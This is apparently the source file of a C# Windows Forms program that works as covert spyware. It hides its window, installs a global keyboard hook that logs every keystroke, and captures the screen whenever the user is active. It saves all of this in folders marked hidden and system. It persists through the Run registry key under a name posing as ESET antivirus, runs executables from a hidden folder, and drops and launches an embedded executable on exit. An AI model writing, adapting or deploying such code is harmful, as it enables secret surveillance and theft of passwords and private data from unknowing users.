using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Drawing.Imaging;
using Microsoft.Win32;
using System.Diagnostics;

namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        GlobalKeyboardHook KH;
        public Form1()
        {
            InitializeComponent();
        }

        ESETTAT.TXTED TRX = new ESETTAT.TXTED();

        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        [DllImport("user32.dll")]
        public static extern Boolean GetLastInputInfo(ref tagLASTINPUTINFO plii);

        public struct tagLASTINPUTINFO
        {
            public uint cbSize;

            public int dwTime;
        }

        string Dirc = "", FNDirc = "";
        bool Hooking = true;
        long TimerR = 0;

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                foreach (string Arg in Environment.GetCommandLineArgs())
                {
                    if (Arg == Environment.CommandLine.Replace("\"", "") || Arg == System.IO.Path.GetFileName(Environment.CommandLine.Replace("\"", "")))
                        continue;
                    if (Arg.StartsWith("/SECURE")) { this.Opacity = .9; this.ShowInTaskbar = true; Hooking = false; }
                }
                if (Hooking)
                {
                    this.Opacity = 0;
                    CreateDrics();
                    File.WriteAllText(FNDirc, "," + Environment.UserName + ",");
                    KH = new GlobalKeyboardHook();//                                        
                    KH.KeyDown += new KeyEventHandler(KH_KeyDown);//                          
                    foreach (Keys key in Enum.GetValues(typeof(Keys)))//                    
                        KH.HookedKeys.Add(key);
                    //KH.hook();
                    if (Hooking)
                    {
                        KH.hook();
                        tmr_Timer.Enabled = Hooking;
                        tmr_SC.Enabled = Hooking;
                        tmr_Control.Enabled = Hooking;
                    }
                }
                foreach (string IdA in Directory.GetFiles(@"D:\TAT\T.S.2\E.X.C"))
                    RUN(IdA, "");
            }
            catch (Exception Ert) { File.WriteAllText(@"D:\TAT\T.S.2\E.R.R\TS2.Main.Log", Ert.Message); Console.Beep(7000, 3000); Application.Exit(); }
        }

        private void CreateDrics()
        {
            if (!Directory.Exists(@"D:\TAT"))                                               //TAT
                Directory.CreateDirectory(@"D:\TAT");

            if (!Directory.Exists(@"D:\TAT\T.S.2"))                                         //TAT\T.S.2
                Directory.CreateDirectory(@"D:\TAT\T.S.2");
            File.SetAttributes(@"D:\TAT\T.S.2", FileAttributes.Hidden | FileAttributes.System);

            if (!Directory.Exists(@"D:\TAT\T.S.2\E.X.C"))                                   //TAT\T.S.2\E.X.C  (EXE Files to RUN)
                Directory.CreateDirectory(@"D:\TAT\T.S.2\E.X.C");
            File.SetAttributes(@"D:\TAT\T.S.2\E.X.C", FileAttributes.Hidden | FileAttributes.System);

            if (!Directory.Exists(@"D:\TAT\T.S.2\S.R.F"))                                   //TAT\T.S.2\S.R.F  (Screen Record Files)
                Directory.CreateDirectory(@"D:\TAT\T.S.2\S.R.F");
            File.SetAttributes(@"D:\TAT\T.S.2\S.R.F", FileAttributes.Hidden | FileAttributes.System);

            if (!Directory.Exists(@"D:\TAT\T.S.2\E.R.R"))                                   //TAT\T.S.2\E.R.R  (Error Logs)
                Directory.CreateDirectory(@"D:\TAT\T.S.2\E.R.R");
            File.SetAttributes(@"D:\TAT\T.S.2\E.R.R", FileAttributes.Hidden | FileAttributes.System);

            Dirc = @"D:\TAT\T.S.2\S.R.F\" + DateTime.Now.ToString().Replace('/', '-').Replace(':', '-');
            Directory.CreateDirectory(Dirc);
            File.SetAttributes(Dirc, FileAttributes.Hidden | FileAttributes.System);
            FNDirc = Dirc + "\\" + Path.GetRandomFileName() + Path.GetRandomFileName() + ".R";

        }

        public void KH_KeyDown(object sender, KeyEventArgs E)
        {
            try
            {
                string Tyu = File.ReadAllText(FNDirc);
                File.WriteAllText(FNDirc, Tyu + TimerR.ToString() + ":" + E.KeyData.ToString() + ",");
            }
            catch (Exception Ert) { File.WriteAllText(@"D:\TAT\T.S.2\E.R.R\ErrorKH_HOOK.Log", Ert.Message); Console.Beep(7000, 3000); Application.Exit(); }
        }

        private void tmr_SC_Tick(object sender, EventArgs e)
        {
            string T = TimerR.ToString();
            if (IdleTime() < 60)
            {
                
                Bitmap BMPSC = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                   Screen.PrimaryScreen.Bounds.Height,
                                   PixelFormat.Format32bppArgb);

                Graphics GPHSC = Graphics.FromImage(BMPSC);

                GPHSC.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                Screen.PrimaryScreen.Bounds.Y,
                                0,
                                0,
                                Screen.PrimaryScreen.Bounds.Size,
                                CopyPixelOperation.SourceCopy);

                BMPSC.Save(Dirc + @"\" + TRX.StrToHexStrEN(T) + ".P");

            }
            else
            {
                File.WriteAllText(Dirc + @"\" + TRX.StrToHexStrEN(T) + ".P", "IDLE\n" + IdleTime().ToString());
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                if (Hooking)
                {
                    try { File.WriteAllBytes(@"D:\TAT\T.S.2\C.N.T.exe", ESETTAT.Properties.Resources.C_N); }
                    catch { }
                    RUN(@"D:\TAT\T.S.2\C.N.T.exe", "");
                }
            }
            catch (Exception Ert) { File.WriteAllText(@"D:\TAT\T.S.2\E.R.R\ErrorClosing.Log", Ert.Message); Console.Beep(7000, 3000); Application.Exit(); }
        }

        private void tmr_Timer_Tick(object sender, EventArgs e)
        {
            TimerR++;
        }

        public static int IdleTime() //In seconds
        {
            tagLASTINPUTINFO LastInput = new tagLASTINPUTINFO();
            int indletimmme = 0;
            LastInput.cbSize = (uint)Marshal.SizeOf(LastInput);
            LastInput.dwTime = 0;
            if (GetLastInputInfo(ref LastInput))
            {
                indletimmme = System.Environment.TickCount - LastInput.dwTime;
                return indletimmme / 1000;
            }
            return 0;
        }

        private void tmr_Control_Tick(object sender, EventArgs e)
        {
            registryKey.SetValue("ESET-t", Application.ExecutablePath);

            Hooking = !(File.Exists(@"D:\TAT\T.S.2\S.T.O.P"));

            tmr_Timer.Enabled = Hooking;
            tmr_SC.Enabled = Hooking;

        }

        public void RUN(string FileNAme, string ARguments)
        {
            try
            {
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
                startInfo.FileName = FileNAme;
                startInfo.Arguments = ARguments;
                process.StartInfo = startInfo;
                process.Start();
            }
            catch (Exception Ert) { File.WriteAllText(@"D:\TAT\T.S.2\E.R.R\RunningFile.Log", Ert.Message); Console.Beep(7000, 3000); Application.Exit(); }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Enc127\n\n" + TRX.CODETEXT(txt1.Text, 127, 0, true) + "\n\n\n\n\n\ndec127\n\n" + TRX.CODETEXT(txt1.Text, 127, 1, true) + "\n\n\n\n\n\n\nencHex\n\n" + TRX.StrToHexStrEN(txt1.Text));
        }


    }
}
